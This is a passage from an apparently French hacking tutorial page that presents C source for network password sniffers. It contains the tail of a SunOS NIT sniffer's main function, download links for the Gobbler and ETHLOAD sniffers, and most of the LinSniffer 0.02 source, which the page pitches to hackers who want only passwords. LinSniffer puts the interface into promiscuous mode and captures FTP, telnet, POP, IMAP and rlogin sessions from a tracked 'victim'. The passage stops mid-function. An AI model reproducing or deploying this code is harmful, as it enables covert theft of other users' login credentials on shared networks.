<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; strcpy(pwd,AUTHPASSWD);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; sprintf(prmpt,"(%s)UP?
",ProgName);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; buf=getpass(prmpt);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(strcmp(pwd,crypt(buf,pwd)))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
exit(1);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; */</font></tt>
<br><tt><font color="#FF0000">void main(argc, argv)</font></tt>
<br><tt><font color="#FF0000">int argc;</font></tt>
<br><tt><font color="#FF0000">char **argv;</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp; cbuf[BUFSIZ];</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct ifconf ifc;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;
s,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ac=1,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
backg=0;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; ProgName=argv[0];</font></tt>
<p><tt><font color="#FF0000">&nbsp;/*&nbsp;&nbsp;&nbsp;&nbsp; getauth();
*/</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; LOG=NULL;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; device=NULL;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; while((ac&lt;argc) &amp;&amp;
(argv[ac][0] == '-')) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; register
char ch = argv[ac++][1];</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch(toupper(ch))
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'I': device=argv[ac++];</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a")))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Zexit(1,"Output file cant be opened\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'B': backg=1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case 'D': debug=1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
default : fprintf(ERR,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
"Usage: %s [-b] [-d] [-i interface] [-f file]\n",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ProgName);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
exit(1);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(!device) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if((s=socket(AF_INET, SOCK_DGRAM, 0)) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: socket");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ifc.ifc_len = sizeof(cbuf);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ifc.ifc_buf = cbuf;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if(ioctl(s, SIOCGIFCONF, (char *)&amp;ifc) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
close(s);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
device = ifc.ifc_req->ifr_name;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(ERR,"Using logical
device %s [%s]\n",device,NIT_DEV);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(ERR,"Output to
%s.%s%s",(LOG)?LogName:"stdout",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(debug)?" (debug)":"",(backg)?" Backgrounding ":"\n");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(!LOG)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
LOG=stdout;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGINT, death);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGTERM,death);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGKILL,death);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; signal(SIGQUIT,death);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(backg &amp;&amp; debug)
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fprintf(ERR,"[Cannot bg with debug on]\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
backg=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(backg) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register int s;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if((s=fork())>0) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fprintf(ERR,"[pid %d]\n",s);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
exit(0);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} else if(s&lt;0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"fork");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if( (s=open("/dev/tty",O_RDWR))>0 ) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ioctl(s,TIOCNOTTY,(char *)NULL);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
close(s);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(LOG,"\nLog started
at => %s [pid %d]\n",NOWtm(),getpid());</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fflush(LOG);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; do_it();</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br>&nbsp;
<ul>
<li>
<u>Gobbler:</u> c'est un bon sniffer qui est singulier par sa pr&eacute;sentation.
Trouvable sur <a href="ftp://ftp.tortada.se/www/hokum/gobbler.zip">ftp://ftp.tortada.se/www/hokum/gobbler.zip</a></li>

<li>
<u>ETHLOAD:</u> un excellent sniffer ethernet qui permettait de surveiller
les session "rlogin" et "telnet", ce sniffer n'&eacute;tant plus distribu&eacute;
par les d&eacute;veloppeurs eux-m&ecirc;mes, on peut le trouver sur: <a href="http://www.computercraft.com/noprogs/ethld104.zip">http://www.computercraft.com/noprogs/ethld104.zip</a></li>

<li>
LinSniff: pour tous les hackers qui veulent que les mots de passe. Celui-ci
ne sniffe QUE les mots de passe. En voici le code source, &agrave; compiler
en C:</li>
</ul>
<tt><font color="#FF0000">/*</font></tt>
<br><tt><font color="#FF0000">LinSniffer 0.02 [BETA]</font></tt>
<br><tt><font color="#FF0000">Mike Edulla</font></tt>
<br><tt><font color="#FF0000">medulla@infosoc.com</font></tt>
<br><tt><font color="#FF0000">DO NOT REDISTRIBUTE</font></tt>
<br><tt><font color="#FF0000">*/</font></tt>
<br>&nbsp;
<p><tt><font color="#FF0000">#include &lt;sys/types.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/socket.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/time.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/in.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netdb.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;string.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/if.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;signal.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;stdio.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;arpa/inet.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/socket.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/ip.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/tcp.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;linux/if_ether.h></font></tt>
<br>&nbsp;
<p><tt><font color="#FF0000">int openintf(char *);</font></tt>
<br><tt><font color="#FF0000">int read_tcp(int);</font></tt>
<br><tt><font color="#FF0000">int filter(void);</font></tt>
<br><tt><font color="#FF0000">int print_header(void);</font></tt>
<br><tt><font color="#FF0000">int print_data(int, char *);</font></tt>
<br><tt><font color="#FF0000">char *hostlookup(unsigned long int);</font></tt>
<br><tt><font color="#FF0000">void clear_victim(void);</font></tt>
<br>&nbsp;
<p><tt><font color="#FF0000">struct etherpacket</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; struct ethhdr eth;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; struct iphdr&nbsp; ip;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; struct tcphdr tcp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; char buff[8192];</font></tt>
<br><tt><font color="#FF0000">}ep;</font></tt>
<p><tt><font color="#FF0000">struct</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; unsigned long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
saddr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; unsigned long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
daddr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; unsigned short&nbsp;&nbsp;&nbsp;&nbsp;
sport;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; unsigned short&nbsp;&nbsp;&nbsp;&nbsp;
dport;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
bytes_read;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
active;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; time_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
start_time;</font></tt>
<br><tt><font color="#FF0000">} victim;</font></tt>
<p><tt><font color="#FF0000">struct iphdr&nbsp; *ip;</font></tt>
<br><tt><font color="#FF0000">struct tcphdr *tcp;</font></tt>
<p><tt><font color="#FF0000">#define CAPTLEN 512</font></tt>
<br><tt><font color="#FF0000">#define TIMEOUT 30</font></tt>
<br>&nbsp;
<p><tt><font color="#FF0000">int openintf(char *d)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int fd;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; struct ifreq ifr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int s;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fd=socket(AF_INET, SOCK_PACKET,
htons(0x800));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(fd &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("cant
get SOCK_PACKET socket");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; strcpy(ifr.ifr_name, d);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; s=ioctl(fd, SIOCGIFFLAGS, &amp;ifr);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(s &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("cant
get flags");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ifr.ifr_flags |= IFF_PROMISC;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; s=ioctl(fd, SIOCSIFFLAGS, &amp;ifr);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(s &lt; 0) perror("cant set
promiscuous mode");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; return fd;</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">int read_tcp(int s)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int x;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; while(1)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x=read(s,
(struct etherpacket *)&amp;ep, sizeof(ep));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(x > 1)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if(filter()==0) continue;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
x=x-54;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if(x &lt; 1) continue;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
return x;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">int filter(void)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int p;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; p=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ip->protocol != 6) return
0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(victim.active != 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(victim.bytes_read
> CAPTLEN)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
printf("\n----- [CAPLEN Exceeded]\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clear_victim();</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(victim.active != 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(time(NULL)
> (victim.start_time + TIMEOUT))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
printf("\n----- [Timed Out]\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clear_victim();</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ntohs(tcp->dest)==21)&nbsp;
p=1; /* ftp */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ntohs(tcp->dest)==23)&nbsp;
p=1; /* telnet */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ntohs(tcp->dest)==110) p=1;
/* pop3 */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ntohs(tcp->dest)==109) p=1;
/* pop2 */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ntohs(tcp->dest)==143) p=1;
/* imap2 */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ntohs(tcp->dest)==513) p=1;
/* rlogin */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ntohs(tcp->dest)==106) p=1;
/* poppasswd */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(victim.active == 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(p == 1)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if(tcp->syn == 1)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
victim.saddr=ip->saddr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
victim.daddr=ip->daddr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
victim.active=1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
victim.sport=tcp->source;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
victim.dport=tcp->dest;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
victim.bytes_read=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
victim.start_time=time(NULL);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
print_header();</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(tcp->dest != victim.dport)
return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(tcp->source != victim.sport)
return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ip->saddr != victim.saddr)
return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(ip->daddr != victim.daddr)
return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(tcp->rst == 1)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; victim.active=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alarm(0);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("\n-----
[RST]\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clear_victim();</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(tcp->fin == 1)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; victim.active=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alarm(0);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("\n-----
[FIN]\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clear_victim();</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; return 1;</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br>&nbsp;
<p><tt><font color="#FF0000">int print_header(void)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; puts(" ");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; printf("%s => ", hostlookup(ip->saddr));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; printf("%s [%d]\n", hostlookup(ip->daddr),
ntohs(tcp->dest));</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">int print_data(int datalen, char *data)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int i=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int t=0;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; victim.bytes_read=victim.bytes_read+datalen;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; for(i=0;i != datalen;i++)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(data[i]
== 13) {puts(" ");t=0;}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(isprint(data[i]))
{printf("%c", data[i]);t++;}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(t > 75)
{t=0;puts(" ");}</font></tt>
